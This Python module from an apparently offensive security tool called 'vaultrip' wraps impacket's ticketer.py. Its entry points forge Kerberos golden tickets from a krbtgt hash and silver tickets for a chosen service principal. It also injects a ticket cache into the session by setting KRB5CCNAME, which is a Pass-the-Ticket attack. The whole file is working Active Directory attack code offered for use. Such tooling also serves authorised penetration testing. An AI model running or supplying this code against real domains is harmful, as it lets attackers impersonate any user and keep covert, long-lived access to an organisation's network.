# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
Kerberos ticket forging — golden ticket, silver ticket, and Pass-the-Ticket injection.

Uses impacket's ticketer for ticket construction and writes to a .ccache file.
Pass-the-Ticket sets KRB5CCNAME in the current process environment.

Requires: pip install vaultrip[attack]
"""

from __future__ import annotations

import logging
import os
import shutil
import tempfile

from ..reporter import ForgedTicketFinding, ScanResult

log = logging.getLogger("vaultrip.kerberos_forge")


# ---------------------------------------------------------------------------
# Public entry points
# ---------------------------------------------------------------------------

def run_forge_golden(
    result: ScanResult,
    *,
    ad_domain: str,
    domain_sid: str,
    krbtgt_hash: str,
    attack_user: str,
    timeout: int = 30,  # noqa: ARG001
) -> None:
    """Forge a Kerberos golden ticket (TGT) for *attack_user*."""
    try:
        from impacket.krb5.ccache import CCache  # noqa: F401  (import check)
    except ImportError:
        result.append_error(
            "forge-golden: impacket not installed — install vaultrip[attack]."
        )
        return

    log.info("forge: golden ticket → %s\\%s", ad_domain, attack_user)

    try:
        ticket_path = _forge_ticket(
            ticket_type="golden",
            ad_domain=ad_domain,
            domain_sid=domain_sid,
            nt_hash=krbtgt_hash,
            username=attack_user,
            spn=None,
        )
    except Exception as exc:
        result.append_error(f"forge-golden: {exc}")
        log.exception("forge: golden ticket failed")
        return

    finding = ForgedTicketFinding(
        ticket_type="golden",
        domain=ad_domain,
        username=attack_user,
        ticket_path=ticket_path,
        injected=False,
    )
    result.append_forged(finding)
    log.info("forge: golden ticket written to %s", ticket_path)


def run_forge_silver(
    result: ScanResult,
    *,
    ad_domain: str,
    domain_sid: str,
    attack_hash: str,
    spn: str,
    attack_user: str,
    timeout: int = 30,  # noqa: ARG001
) -> None:
    """Forge a Kerberos silver ticket (service ticket) for *spn*."""
    try:
        from impacket.krb5.ccache import CCache  # noqa: F401  (import check)
    except ImportError:
        result.append_error(
            "forge-silver: impacket not installed — install vaultrip[attack]."
        )
        return

    log.info("forge: silver ticket → %s for %s", spn, attack_user)

    try:
        ticket_path = _forge_ticket(
            ticket_type="silver",
            ad_domain=ad_domain,
            domain_sid=domain_sid,
            nt_hash=attack_hash,
            username=attack_user,
            spn=spn,
        )
    except Exception as exc:
        result.append_error(f"forge-silver: {exc}")
        log.exception("forge: silver ticket failed")
        return

    finding = ForgedTicketFinding(
        ticket_type="silver",
        domain=ad_domain,
        username=attack_user,
        ticket_path=ticket_path,
        injected=False,
        spn=spn,
    )
    result.append_forged(finding)
    log.info("forge: silver ticket written to %s", ticket_path)


def run_ptt(result: ScanResult, *, ticket_path: str) -> None:
    """Pass-the-Ticket: inject *ticket_path* into the current session via KRB5CCNAME."""
    expanded = os.path.expanduser(ticket_path)
    if not os.path.isfile(expanded):
        result.append_error(f"ptt: ticket file not found: {expanded}")
        return

    # Copy to a temp location and point KRB5CCNAME at it so the process and
    # any child processes (e.g. kinit, curl with GSSAPI) use the injected ticket.
    tmp = tempfile.NamedTemporaryFile(
        prefix="vr_ptt_", suffix=".ccache", delete=False
    )
    try:
        shutil.copy2(expanded, tmp.name)
        os.environ["KRB5CCNAME"] = tmp.name
    except Exception as exc:
        result.append_error(f"ptt: {exc}")
        log.exception("ptt: injection failed")
        return

    # Record as a ForgedTicketFinding with injected=True so it shows in summary
    finding = ForgedTicketFinding(
        ticket_type="injected",
        domain="",
        username="",
        ticket_path=tmp.name,
        injected=True,
    )
    result.append_forged(finding)
    log.info("ptt: KRB5CCNAME set to %s", tmp.name)


# ---------------------------------------------------------------------------
# Internal — impacket ticketer wrapper
# ---------------------------------------------------------------------------

def _forge_ticket(
    *,
    ticket_type: str,
    ad_domain: str,
    domain_sid: str,
    nt_hash: str,
    username: str,
    spn: str | None,
) -> str:
    """Build a golden or silver ticket via impacket and write it to a temp .ccache.

    Returns the path to the written ccache file.
    """
    # impacket's ticketer lives in examples/ticketer.py which is a script.
    # We invoke the core Kerberos construction directly.
    import subprocess
    import sys

    out_file = tempfile.NamedTemporaryFile(
        prefix=f"vr_{ticket_type}_", suffix=".ccache", delete=False
    )
    out_file.close()

    # Build the ticketer.py command — it ships with impacket as a CLI script
    ticketer_cmd = _find_ticketer()
    if ticketer_cmd is None:
        raise RuntimeError(
            "impacket ticketer.py not found — ensure impacket is installed correctly."
        )

    cmd = [
        sys.executable, ticketer_cmd,
        "-nthash", nt_hash,
        "-domain-sid", domain_sid,
        "-domain", ad_domain,
        "-dc-ip", ad_domain,       # ticketer resolves the domain; DC IP used if provided
        "-out", out_file.name.removesuffix(".ccache"),
    ]
    if ticket_type == "silver" and spn:
        cmd += ["-spn", spn]
    cmd.append(username)

    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    if proc.returncode != 0:
        raise RuntimeError(
            f"ticketer exited {proc.returncode}: {proc.stderr.strip()[:300]}"
        )

    # ticketer writes <username>.ccache — normalise to our temp path
    expected = out_file.name.removesuffix(".ccache") + ".ccache"
    if os.path.isfile(expected) and expected != out_file.name:
        os.replace(expected, out_file.name)

    return out_file.name


def _find_ticketer() -> str | None:
    """Locate impacket's ticketer.py on the current Python path."""
    import importlib.util
    import pathlib

    # Try the impacket examples directory
    spec = importlib.util.find_spec("impacket")
    if spec and spec.origin:
        examples = pathlib.Path(spec.origin).parent / "examples" / "ticketer.py"
        if examples.is_file():
            return str(examples)

    # Fall back to PATH
    found = shutil.which("ticketer.py") or shutil.which("ticketer")
    return found
